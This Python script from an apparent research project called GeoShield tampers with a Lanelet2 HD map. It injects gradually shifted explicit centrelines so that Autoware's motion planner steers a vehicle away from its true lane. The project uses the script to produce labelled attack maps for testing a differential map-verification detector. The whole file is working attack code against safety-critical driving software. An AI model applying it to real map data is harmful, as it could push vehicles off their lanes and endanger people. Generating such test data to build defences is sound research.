#!/usr/bin/env python3
"""
GeoShield -- Phase 8: centreline injection attack.

    python3 centerline_attack.py \
        --map ~/autoware_map/nishishinjuku_autoware_map/lanelet2_map.osm \
        --target 3012234,3013054,3013093,3012977,3002017,3013032,3002007,3002013 \
        --max-shift 2.0 \
        --out data/centerline_attack.osm \
        --labels data/centerline_labels.json


WHY THIS ATTACK, WHEN WIDTH WIDENING ALREADY "WORKED"
------------------------------------------------------
Width widening changed the map substantially and the vehicle barely at all:

    lanelet 3002013     3.06 m -> 6.36 m
    centreline shift    2.79 m
    driven deviation    0.051 m      <-- five centimetres

Autoware's motion planner optimises a smooth trajectory INSIDE the drivable
area. It does not track the geometric centre. Widening a straight lane
therefore PERMITS lateral movement without CAUSING it -- the planner keeps its
existing line because that line is still legal and still smooth.

Sato et al. (VehicleSec 2025) hit the same wall and resolved it the same way:
once a centerline is introduced, the AV strictly adheres to it, so attackers
can use centerline modification to direct the vehicle along specific paths.

Our map has ZERO explicit centrelines (`grep -c 'role="centerline"'` returns 0),
so Autoware computes them and the planner is free to smooth over our tampering.
Writing an explicit centreline removes that freedom.

    width widening    : changes how much space is drivable  -> planner MAY move
    centreline inject : changes where the car should drive  -> planner FOLLOWS

WHAT IS WRITTEN
---------------
For each target lanelet, one new <way> and one new <member role="centerline">:

    <relation id="3002013">
      <member type="way" ref="1234" role="left"/>
      <member type="way" ref="5678" role="right"/>
      <member type="way" ref="9001" role="centerline"/>   <-- injected
      <tag k="type" v="lanelet"/>
    </relation>

The injected line is the lanelet's true centre displaced laterally, ramped
along the run so the first lanelet barely moves and the last moves fully. A
ramp keeps the path continuous -- an abrupt jump produces an infeasible plan
and the vehicle simply stops, which Sato also observed at w_l = 5.0 m.

DETECTABILITY NOTE
------------------
This attack is trivially caught by differential verification: the previous
map version has no centreline member at all, so its appearance is a structural
change, not a geometric one. That is the point -- the attack is more dangerous
AND more detectable, which is exactly the argument for verifying map updates
against their history rather than in isolation.
"""

from __future__ import annotations

import argparse
import json
import math
import sys
import xml.etree.ElementTree as ET
from pathlib import Path


# ----------------------------------------------------------------------

def parse(map_path: str):
    tree = ET.parse(map_path)
    root = tree.getroot()

    nodes = {}
    for n in root.findall("node"):
        tags = {t.get("k"): t.get("v") for t in n.findall("tag")}
        try:
            nodes[int(n.get("id"))] = {
                "x": float(tags["local_x"]), "y": float(tags["local_y"]),
                "lat": n.get("lat"), "lon": n.get("lon"),
                "ele": tags.get("ele", "0"),
            }
        except (KeyError, TypeError, ValueError):
            pass

    ways = {int(w.get("id")): [int(nd.get("ref")) for nd in w.findall("nd")]
            for w in root.findall("way")}

    lanelets = {}
    for rel in root.findall("relation"):
        tags = {t.get("k"): t.get("v") for t in rel.findall("tag")}
        if tags.get("type") != "lanelet":
            continue
        entry = {"rel": rel, "left": None, "right": None, "centerline": None}
        for mem in rel.findall("member"):
            role = mem.get("role")
            if role in ("left", "right", "centerline"):
                entry[role] = int(mem.get("ref"))
        lanelets[int(rel.get("id"))] = entry

    return tree, root, nodes, ways, lanelets


def resample(pts, n):
    """n points spaced evenly by arc length."""
    if len(pts) < 2:
        return pts * n
    cum, total = [0.0], 0.0
    for i in range(len(pts) - 1):
        total += math.dist(pts[i], pts[i + 1])
        cum.append(total)
    if total == 0:
        return [pts[0]] * n
    out, j = [], 0
    for i in range(n):
        target = total * i / (n - 1)
        while j < len(cum) - 2 and cum[j + 1] < target:
            j += 1
        span = cum[j + 1] - cum[j]
        t = 0.0 if span == 0 else (target - cum[j]) / span
        out.append((pts[j][0] + t * (pts[j + 1][0] - pts[j][0]),
                    pts[j][1] + t * (pts[j + 1][1] - pts[j][1])))
    return out


def centre_of(lanelet, nodes, ways, samples=12):
    """True centre of a lanelet, from its two boundaries."""
    lw, rw = lanelet["left"], lanelet["right"]
    if lw not in ways or rw not in ways:
        return None
    lp = [(nodes[n]["x"], nodes[n]["y"]) for n in ways[lw] if n in nodes]
    rp = [(nodes[n]["x"], nodes[n]["y"]) for n in ways[rw] if n in nodes]
    if len(lp) < 2 or len(rp) < 2:
        return None
    l, r = resample(lp, samples), resample(rp, samples)
    return [((a[0] + b[0]) / 2, (a[1] + b[1]) / 2) for a, b in zip(l, r)]


def shift_laterally(pts, shifts):
    """Displace each point perpendicular to the local path direction."""
    out = []
    for i, p in enumerate(pts):
        q = pts[min(i + 1, len(pts) - 1)]
        r = pts[max(i - 1, 0)]
        tx, ty = q[0] - r[0], q[1] - r[1]
        mag = math.hypot(tx, ty)
        if mag < 1e-9:
            out.append(p)
            continue
        nx, ny = -ty / mag, tx / mag        # left-hand normal
        s = shifts[i]
        out.append((p[0] + nx * s, p[1] + ny * s))
    return out


# ----------------------------------------------------------------------

def inject(map_path, targets, out_path, max_shift=2.0, samples=12,
           direction=1.0):
    tree, root, nodes, ways, lanelets = parse(map_path)

    existing = sum(1 for l in lanelets.values() if l["centerline"])
    print(f"lanelets              : {len(lanelets)}")
    print(f"with explicit centreline: {existing}")
    if existing:
        print("  ! this map already stores centrelines -- the attack still")
        print("    works but the planner was already following them")

    next_id = max(list(nodes) + list(ways) +
                  [int(r.get("id")) for r in root.findall("relation")]) + 1

    valid = [t for t in targets if t in lanelets]
    if not valid:
        sys.exit("none of the target lanelet ids exist in this map")

    labels = {}
    n_done = 0

    for k, lid in enumerate(valid):
        ll = lanelets[lid]
        centre = centre_of(ll, nodes, ways, samples)
        if centre is None:
            continue

        # Ramp the displacement along the run: first lanelet barely moves,
        # last moves fully. An abrupt jump makes the plan infeasible and the
        # vehicle stops -- a failed attack, as Sato observed at w_l = 5.0 m.
        frac_start = k / max(len(valid) - 1, 1)
        frac_end = (k + 1) / max(len(valid) - 1, 1)
        shifts = [direction * max_shift *
                  (frac_start + (frac_end - frac_start) * i / (samples - 1))
                  for i in range(samples)]

        shifted = shift_laterally(centre, shifts)

        # write the new nodes
        node_ids = []
        for (x, y) in shifted:
            nid = next_id
            next_id += 1
            n = ET.SubElement(root, "node", id=str(nid), visible="true",
                              version="1", lat="0", lon="0")
            ET.SubElement(n, "tag", k="local_x", v=f"{x:.4f}")
            ET.SubElement(n, "tag", k="local_y", v=f"{y:.4f}")
            ET.SubElement(n, "tag", k="ele", v="0")
            node_ids.append(nid)

        # write the new way
        wid = next_id
        next_id += 1
        w = ET.SubElement(root, "way", id=str(wid), visible="true", version="1")
        for nid in node_ids:
            ET.SubElement(w, "nd", ref=str(nid))
        ET.SubElement(w, "tag", k="type", v="line_thin")
        ET.SubElement(w, "tag", k="subtype", v="solid")

        # attach it to the lanelet
        ET.SubElement(ll["rel"], "member", type="way", ref=str(wid),
                      role="centerline")

        labels[f"lanelet:{lid}"] = {
            "segment_id": f"lanelet:{lid}",
            "attack_type": "centerline_injection",
            "field_changed": "centerline",
            "original": None,
            "tampered": f"way:{wid}",
            "shift_start_m": round(shifts[0], 3),
            "shift_end_m": round(shifts[-1], 3),
            "ramp_position": k + 1,
            "ramp_length": len(valid),
        }
        n_done += 1
        print(f"  lanelet:{lid:<12} centreline shifted "
              f"{shifts[0]:+.2f} m -> {shifts[-1]:+.2f} m  [{k+1}/{len(valid)}]")

    tree.write(out_path, encoding="utf-8", xml_declaration=True)
    return labels, n_done


def main():
    ap = argparse.ArgumentParser(description="centreline injection attack")
    ap.add_argument("--map", required=True, help="clean Lanelet2 .osm")
    ap.add_argument("--target", required=True,
                    help="comma-separated lanelet ids, in route order")
    ap.add_argument("--max-shift", type=float, default=2.0, dest="max_shift",
                    help="final lateral displacement in metres")
    ap.add_argument("--direction", type=float, default=1.0,
                    help="1.0 shifts left, -1.0 shifts right")
    ap.add_argument("--samples", type=int, default=12,
                    help="points per injected centreline")
    ap.add_argument("--out", required=True)
    ap.add_argument("--labels")
    a = ap.parse_args()

    targets = [int(x) for x in a.target.split(",") if x.strip()]
    print(f"targets: {len(targets)} lanelets, max shift {a.max_shift} m\n")

    labels, n = inject(a.map, targets, a.out, a.max_shift, a.samples,
                       a.direction)

    print(f"\nwrote {a.out}")
    print(f"  centrelines injected: {n}")

    if a.labels:
        Path(a.labels).write_text(json.dumps(labels, indent=2))
        print(f"  labels             : {a.labels}")

    print("\nNext:")
    print(f"  scp {a.out} to EC2, load in Autoware, run the scenario.")
    print("  Unlike width widening, the planner has no freedom here -- it")
    print("  follows the centreline it is given. Expect a visible deviation.")
    print("\n  Then verify GeoShield still catches it:")
    print(f"  python3 differential_verify.py --previous {a.map} \\")
    print(f"      --candidate {a.out} --labels {a.labels or 'LABELS'}")


if __name__ == "__main__":
    main()